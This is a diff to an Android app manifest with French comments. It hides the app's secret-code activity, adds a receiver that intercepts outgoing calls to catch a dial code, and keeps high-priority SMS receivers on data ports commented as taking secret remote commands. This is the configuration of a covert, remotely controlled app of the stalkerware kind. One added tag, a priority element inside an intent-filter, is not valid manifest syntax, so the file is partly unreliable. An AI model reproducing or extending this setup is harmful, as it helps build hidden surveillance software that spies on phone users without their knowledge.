@@ -12,6 +12,7 @@
     <uses-permission android:name="android.permission.BROADCAST_SMS" />
     <uses-permission android:name="android.permission.READ_SMS" />
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS" />
 
     <application
         android:allowBackup="true"
@@ -33,49 +34,34 @@
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
-            
-            <!-- ✅ PERMET LA RÉVÉLATION PAR RECHERCHE -->
-            <intent-filter>
-                <action android:name="android.intent.action.SEARCH" />
-                <category android:name="android.intent.category.DEFAULT" />
-            </intent-filter>
         </activity>
 
-        <!-- ✅ ACTIVITÉ DE RÉVÉLATION PAR CODE SECRET -->
-        <activity android:name=".SecretInputActivity" android:exported="true"
-            android:label="🔓"
-            android:icon="@android:drawable/ic_menu_info_details"
-            android:excludeFromRecents="true"
-            android:taskAffinity="">
+        <!-- ✅ RECEVEUR POUR INTERCEPTER LE CODE TÉLÉPHONE -->
+        <receiver android:name=".DialCodeReceiver" android:exported="true">
             <intent-filter>
-                <action android:name="android.intent.action.MAIN" />
-                <category android:name="android.intent.category.LAUNCHER" />
-                <data android:scheme="bloom" android:host="open" />
-            </intent-filter>
-            
-            <!-- ✅ APPARAÎT DANS LES RÉSULTATS DE RECHERCHE -->
-            <meta-data
-                android:name="android.app.searchable"
-                android:resource="@xml/searchable" />
-        </activity>
-
-        <!-- ✅ RECEVEUR SMS -->
-        <receiver android:name=".SMSReceiver" android:exported="true"
-            android:permission="android.permission.BROADCAST_SMS">
-            <intent-filter android:priority="999">
-                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
+                <action android:name="android.intent.action.NEW_OUTGOING_CALL" />
                 <category android:name="android.intent.category.DEFAULT" />
-                <data android:port="10001" android:scheme="sms" />
+                <priority android:value="999" />
             </intent-filter>
         </receiver>
 
-        <!-- ✅ COMMANDES SECRÈTES PAR SMS -->
+        <!-- ✅ RECEVEUR SMS POUR COMMANDES À DISTANCE -->
         <receiver android:name=".SecretCommandReceiver" android:exported="true"
             android:permission="android.permission.BROADCAST_SMS">
             <intent-filter android:priority="998">
                 <action android:name="android.provider.Telephony.SMS_RECEIVED" />
                 <category android:name="android.intent.category.DEFAULT" />
                 <data android:port="10002" android:scheme="sms" />
+            </intent-filter>
+        </receiver>
+
+        <!-- ✅ RECEVEUR SMS PRINCIPAL -->
+        <receiver android:name=".SMSReceiver" android:exported="true"
+            android:permission="android.permission.BROADCAST_SMS">
+            <intent-filter android:priority="997">
+                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
+                <category android:name="android.intent.category.DEFAULT" />
+                <data android:port="10001" android:scheme="sms" />
             </intent-filter>
         </receiver>
 
